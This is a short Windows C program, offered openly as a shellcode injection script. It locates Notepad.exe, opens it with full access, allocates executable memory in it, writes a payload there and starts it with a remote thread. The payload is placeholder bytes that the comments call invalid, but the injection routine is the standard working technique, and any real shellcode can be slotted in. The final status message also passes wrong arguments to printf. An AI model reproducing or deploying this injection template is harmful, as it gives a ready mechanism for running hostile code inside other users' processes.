#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <string.h>

// simple script for a shell code injection

// this will most likely not work for most apps 

DWORD procid(char* proc) { // Gets the id of a proc using its name
    PROCESSENTRY32 proce;
    HANDLE hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hsnap == INVALID_HANDLE_VALUE) {
        return 0;
    }

    proce.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hsnap, &proce)) {
        do {
            if (strcmp(proc, proce.szExeFile) == 0) {
                CloseHandle(hsnap);
                return proce.th32ProcessID;
            }
        } while (Process32Next(hsnap, &proce));
    }

    CloseHandle(hsnap);
    return 0;
}

int main() {
    char* proc = "Notepad.exe";
    DWORD pid = procid(proc); // uses the procid to get the proc id of a proc using it's name

    // this shellcode is invalid 
    // so if it will prolly crash the thread when it injects it

    unsigned char shellcode[] = "\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69\x69"; // this is the payload that will be injected into the target process
    

    if (pid == 0) {
        printf("[!] Invalid Process Name");
        return 1;
    }

    HANDLE hproc = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);

    if (hproc == NULL) {
        printf("[!] Failed To Open Process");
        return 1;
    }

    printf("[+] Successfully Open Process");

    /*

    so this part is where the shellcode will be allocated and actually written
    into the proc's memory

    */

    LPVOID buffer = VirtualAllocEx(hproc, NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); // Alocates bytes into the process memory
    printf("\n[+] Successfully Allocated Bytes into the proc's memory");
    
    WriteProcessMemory(hproc, buffer, shellcode, sizeof(shellcode), NULL); // writes the allocated memory into the process 
    printf("\n[+] Allocated Memory Has Been Successfully writen into the proc's memory");

    /* 
    
    Now the final part, this section will create a Remote Thread
    To actually run the shell code

    */

   HANDLE tid = NULL;

   HANDLE thread = CreateRemoteThreadEx( // Creates a remote thread and executes the shellcode
    hproc, // process
    NULL,
    0,
    (LPTHREAD_START_ROUTINE)buffer, // Starting Point of the execution
    NULL,
    0,
    0,
    &tid
   );

   if (thread == NULL) {
        printf("\n[!] Failed To Create Remote Thread");
        CloseHandle(hproc);
        return 1;
   }

   printf("\n[+] Successfully Injected The Shell Code Into The Process 🔥🔥🔥 | Process Name: %s | Process ID: %d", &proc, &hproc);
   
   CloseHandle(hproc);
   CloseHandle(thread);

   return 0;
}
